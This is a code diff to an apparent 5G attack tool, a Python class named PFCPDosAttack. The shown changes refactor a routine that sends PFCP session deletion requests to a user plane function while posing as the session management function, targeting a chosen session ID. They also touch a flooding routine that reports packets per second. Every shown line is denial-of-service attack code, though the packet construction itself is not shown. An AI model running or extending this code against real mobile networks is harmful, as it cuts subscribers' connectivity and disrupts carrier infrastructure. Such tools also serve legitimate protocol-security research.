@@ -296,7 +296,7 @@ class Ez_PFCP:
 
 
 class PFCPDosAttack:
-    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15):
+    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
         self.evil_addr = evil_addr
         self.upf_addr = upf_addr
         self.src_port = src_port
@@ -313,6 +313,8 @@ class PFCPDosAttack:
         self.randomize = randomize
         self.lock = threading.Lock()
         self.random_far_number = random_far_number
+        
+        self.smf_addr = smf_addr
         
     def set_random_far_number(self, random_far_number=15):
         self.random_far_number = random_far_number
@@ -487,15 +489,20 @@ class PFCPDosAttack:
         pps = reqNbr / duration if duration > 0 else float("inf")
         print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
     
-    def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr, upf_addr=None, src_port=None, dest_port=None):
+    def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr=None, upf_addr=None, src_port=None, dest_port=None):
         
         upf_addr = upf_addr or self.upf_addr
+        smf_addr = smf_addr or self.smf_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         
         if upf_addr is None:
             print("[DoS] No UPF address provided for PFCP session deletion")
             return
+        if smf_addr == None:
+            print("[DoS] No SMF address provided for PFCP session deletion")
+            return
+        
         if src_port is None:
             print("[DoS] No source port provided for PFCP session deletion")
             return
@@ -507,19 +514,19 @@ class PFCPDosAttack:
         if not target_seid:
             print("[DoS] No SEID provided for PFCP session deletion")
             return
-        if not smf_addr:
-            print("[DoS] No SMF address provided for PFCP session deletion")
-            return
+
         
         
         if self.verbose:
             print(f"[DoS] Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
         
-        Ez_PFCP().Send_PFCP_session_deletion_req(seid=target_seid, 
-                                               src_addr=smf_addr, 
-                                               dest_addr=upf_addr, 
-                                               src_port=src_port, 
-                                               dest_port=dest_port)
+        ez_pfcp_obj = Ez_PFCP(src_addr=smf_addr,
+                              dest_addr=upf_addr,
+                              src_port=src_port,
+                              dest_port=dest_port)
+        
+        ez_pfcp_obj.Send_PFCP_session_deletion_req(seid=target_seid)
+        
         
         if self.verbose:
             print(f"[DoS] PFCP Session Deletion packet sent to {upf_addr}")
